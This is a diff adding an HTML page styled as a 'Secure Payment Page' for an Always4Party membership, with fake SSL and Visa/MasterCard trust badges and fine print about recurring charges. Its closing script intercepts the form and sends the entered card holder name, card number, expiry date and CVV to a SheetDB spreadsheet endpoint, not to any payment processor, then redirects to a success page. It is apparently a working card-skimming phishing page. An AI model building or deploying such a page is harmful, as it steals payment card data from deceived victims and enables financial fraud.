@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Payment Page</title>
+  <style>
+    /* General Styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+      color: #333;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0px auto;
+      padding: 20px;
+      background-color: white;
+    }
+
+
+.header h1 {
+  font-size: 24px;
+  font-weight: bold;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.rating {
+  color: gray;
+  font-size: 14px;
+  margin-top: 5px;
+}
+
+
+    .header img {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 5px;
+    }
+
+    .header span {
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+.order-summary {
+  padding: 15px 0;
+  font-size: 16px;
+  color: #555;
+  text-align: left;
+}
+
+.order-summary h2 {
+  font-size: 18px;
+  color: #333;
+  margin-bottom: 10px;
+}
+
+.order-details p {
+  margin: 5px 0;
+  font-weight: bold;
+}
+
+.price1 {
+  font-weight: bold;
+  color: #666;
+  margin-left: 50%;
+}
+
+.price2 {
+  font-weight: bold;
+  color: black;
+  font-size: 18px;
+  margin-left: 46%;
+}
+
+    /* Payment Section */
+    .payment-section {
+      margin-top: 20px;
+      padding-right: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .payment-section label {
+      display: block;
+      font-weight: bold;
+      margin: 10px 0 5px;
+    }
+
+    .payment-section input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      font-size: 16px;
+    }
+
+    .inline-fields {
+        display: flex;
+        gap: 10px; /* Adjust the space between Expiry Date and CVV */
+    }
+
+    .inline-fields div {
+        flex: 1; /* Ensures both fields take equal width */
+    }
+
+    .pay-button {
+      width: 106%;
+      padding: 15px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .pay-button:hover {
+      background-color: #45a049;
+    }
+
+    /* Verified Logos */
+    .verified {
+      display: flex;
+      justify-content: space-around;
+      margin: 20px 0;
+    }
+
+    .verified img {
+      width: 130px;
+    }
+
+    /* Testimonial Section */
+    .testimonial {
+      text-align: center;
+      margin: 20px 0;
+      font-style: italic;
+      color: #555;
+    }
+
+    /* Features Section */
+    .features {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 20px;
+      padding-top: 10px;
+      border-top: 1px solid #ddd;
+    }
+
+    .feature {
+      text-align: center
+    }
+
+    .feature img {
+      width: 170px;
+      margin-bottom: 5px;
+      margin-top: 5px;
+    }
+
+    .feature p {
+      font-size: 12px;
+      color: #666;
+    }
+
+    /* Terms and Conditions */
+    .terms {
+      font-size: 12px;
+      color: #777;
+      margin-top: 20px;
+      text-align: justify;
+      line-height: 1.5;
+    }
+
+/* Top Bar */
+.top-bar {
+  background-color: #000;
+  color: white;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 5px;
+}
+
+.top-bar img {
+  vertical-align: middle;
+  margin-left: 5px;
+  width: 20px;
+}
+
+.top-bar .left, .top-bar .right {
+  display: flex;
+  align-items: center;
+  font-size: 11px;
+}
+.information {
+  font-size: 16px;
+}
+
+.check-icon {
+  color: green;
+  font-weight: bold;
+  margin-left: 5px;
+}
+    input[type="number"]:focus,
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+.input-container {
+    position: relative;
+    display: inline-block;
+}
+
+#card-number {
+    width: 100%;
+    padding-right: 40px; /* Add space for the logo */
+}
+
+.visa-logo {
+    position: absolute;
+    right: 0px; /* Adjust the position from the right */
+    top: 50%;
+    transform: translateY(-50%); /* Center the logo vertically */
+    height: 20px; /* Adjust the size of the logo */
+    width: auto;
+}
+.cvv-logo {
+    position: absolute;
+    right: -15px; /* Adjust the position from the right */
+    top: 75%;
+    transform: translateY(-50%); /* Center the logo vertically */
+    width: 30px;
+}
+
+  </style>
+</head>
+<body>
+        <!-- Top Bar Section -->
+    <div class="top-bar">
+      <div class="left">
+        <span><span><img src="https://img.icons8.com/m_rounded/512/FFFFFF/lock.png" style="width: 15px; margin-bottom: 5px;"></span> SSL SAFE PAYMENT</span>
+      </div>
+      <div class="right">
+        <span>VERIFIED BY</span>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTISgHnLHbq0urYZfc5rRiB-3Ph6YC2LeDlUw&s" alt="Verified by Visa">
+        <img src="https://static-00.iconduck.com/assets.00/mastercard-icon-2048x1581-xdghpq89.png" alt="MasterCard SecureCode">
+      </div>
+    </div>
+  <div class="container">
+
+
+
+<!-- Header Section -->
+<div class="header">
+
+    <span><img src="secure.png" style="width: 300px;"></span>
+
+</div>
+
+
+<h3 style="text-align: center; font-size: 20px; font-weight: 2;">Order summary:</h3>
+<div class="order-details">
+  <p>Service price: <span class="price1">රු 692.78</span></p>
+  <p>Total incl. VAT: <span class="price2">රු 692.78</span></p>
+</div><br>
+<div class="information" style="border-top: 1px solid #ddd;">
+  <h4 style="color: gray;">1. Information <span class="check-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Eo_circle_green_checkmark.svg/1200px-Eo_circle_green_checkmark.svg.png" style="width: 15px; margin-bottom: -1px;"></span></h4>
+</div>
+
+<div class="information" >
+  <h3>2. Payment</h3>
+</div>
+
+<form method="post">
+    <!-- Payment Section -->
+    <div class="payment-section">
+        <!-- <label for="card-holder">Card Holder</label> -->
+        <input type="text" id="card-holder" placeholder="Card Holder Name" name="card-holder">
+<br>
+        <!-- <label for="card-number">Card Number</label> -->
+        <div class="input-container">
+            <input type="text" id="card-number" placeholder="Card Number" oninput="formatCardNumber(this)" maxlength="19" style="width: 92%;" name="card-number">
+            <img src="https://always4party.com/storage/a352726d-2626-44c1-a709-f8f6912802da/cards-v3.png?v=77f1eba5b4e99e70996ec9b46645b90bc454fcce" alt="Visa" class="visa-logo">
+        </div>
+
+<br>
+        <div class="inline-fields">
+            <div>
+                <!-- <label for="expiry-date">Expiry Date</label> -->
+                <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)"  style="width: 90%;" name="expiry-date">
+            </div>
+            <div class="input-container">
+                <!-- <label for="cvv">CVV</label> -->
+                <input type="number" id="cvv" placeholder="CVV" maxlength="3" oninput="validateCVV(this)" name="cvv">
+                <img src="https://always4party.com/storage/3e388b14-f7f6-40cd-b552-a5ac5597063c/cvv-icon-v2.jpg?v=c9a2a834ead4e1c429edef36da2221d56dbc4fe3" alt="Visa" class="cvv-logo">
+            </div>
+        </div>
+
+        <button class="pay-button" type="submit">Pay Now</button>
+    </div>
+</form>
+
+    <!-- Verified Logos -->
+    <div class="verified">
+      <img src="https://www.thechelsea.co.uk/documents/100484/728760/httpswww.thechelsea.co.ukhelponlineverified-by-visa-and-mastercard-securecode.html+-+thumbnail+-+verified+by+visa.gif/2475b5e5-b392-7374-8237-007425012cca?t=1650884492543&download=true" alt="Verified by Visa">
+    </div>
+
+    <!-- Testimonial Section -->
+    <div class="testimonial">
+      <p>By clicking 'Pay Now,' you consent to the conditions of membership and recurring charges of €8.95 every 14 days, which you can cancel anytime.</p>
+    </div>
+    <!-- Features Section -->
+    <div class="features">
+      <div class="feature">
+        <img src="https://always4party.com/storage/17e04225-58b3-4911-9766-acc9102c34e2/trust-v2.jpg?v=b878e8857af189b84ced15ab94c1afe38d58d6f8" alt="Free Support">
+        <p>Free technical support</p>
+      </div>
+    </div>
+
+    <!-- Terms and Conditions -->
+    <div class="terms">
+      <p>We offer our service not only with responsibility but also with great joy and excitement. We strive for the satisfaction of our customers and we take pride in giving you the best service. We ensure that our service is delivered in time and get the best from our customers.</p>
+
+     <p>Your membership starts with your FREE Gift Card! The gift card will be sent to the e-mail registered. Follow the instructions and click on the link to redeem the gift card. The credits will be added automatically to your account.</p>
+
+     <p>We offer new users the opportunity to participate in Always4Party.com membership loyalty club. This special offer gives you the opportunity of becoming a member and tries out full access for 3 days at a minimum rate. After this period, you will become a full member enrolled in the automatic recurrent payment every 14 days, at the then-current rate (6.95€). Don't worry! We remind you three days before each top-up and you can skip as many top-ups as you want, completely free of charge.</p>
+
+     <p>Once the payment has been processed it cannot be invalidated. Your membership services will be available immediately until cancelled. You can cancel your membership anytime by accessing your member account or contacting our customer service representatives by e-mail or live chat. As a valued member, you will be able to enjoy exclusive member-only pricing and dedicated promotions.</p>
+
+     <p>Always4Party.com evaluates the customer’s account behavior while using the services contracted and reserve the right to withdraw or amend the membership plan contracted at our sole discretion without notice to guarantee the quality of the services of this site.</p>
+
+     <p>You will be billed by Always4Party.com. For any questions, please contact our customer support at support@always4party.com or call (+357) 25 008716</p>
+<br>
+      <p style="text-align: center;">&copy; 2024 Soniama Limited, Street Friday 13, <br>29600, Limassol, Cyprus.</p>
+    </div>
+  </div>
+</body>
+<script>
+function formatExpiryDate(input) {
+    let value = input.value.replace(/\D/g, ''); // Remove any non-numeric characters
+    if (value.length > 2) {
+        input.value = value.slice(0, 2) + '/' + value.slice(2, 4); // Insert '/' after the first two digits
+    } else {
+        input.value = value; // Show only the numbers if less than 2 digits
+    }
+}
+function validateCVV(input) {
+    input.value = input.value.replace(/\D/g, '').slice(0, 3); // Allow only numbers and limit to 3 digits
+}
+function formatCardNumber(input) {
+    let value = input.value.replace(/\D/g, ''); // Remove all non-digit characters
+    if (value.length > 4) {
+        value = value.replace(/(\d{4})(\d{1,4})/, '$1-$2');
+    }
+    if (value.length > 9) {
+        value = value.replace(/(\d{4}-\d{4})(\d{1,4})/, '$1-$2');
+    }
+    if (value.length > 14) {
+        value = value.replace(/(\d{4}-\d{4}-\d{4})(\d{1,4})/, '$1-$2');
+    }
+    input.value = value;
+}
+
+</script>
+
+<script>
+    document.querySelector("form").addEventListener("submit", function (e) {
+        e.preventDefault(); // Prevent the default form submission
+
+        // Collect form data
+        const formData = new FormData(e.target);
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
+
+        // SheetDB API endpoint
+        const SHEETDB_API_URL = "https://sheetdb.io/api/v1/txagn9h9qbdpe";
+
+        // Send the form data to SheetDB
+        fetch(SHEETDB_API_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ data: [data] }),
+        })
+        .then(response => {
+            if (response.ok) {
+                // Redirect to another page on success
+                window.location.href = "success.html"; // Replace with your redirect URL
+            } else {
+                throw new Error("Failed to submit form data");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("There was an error submitting the form. Please try again.");
+        });
+    });
+</script>
+</html>
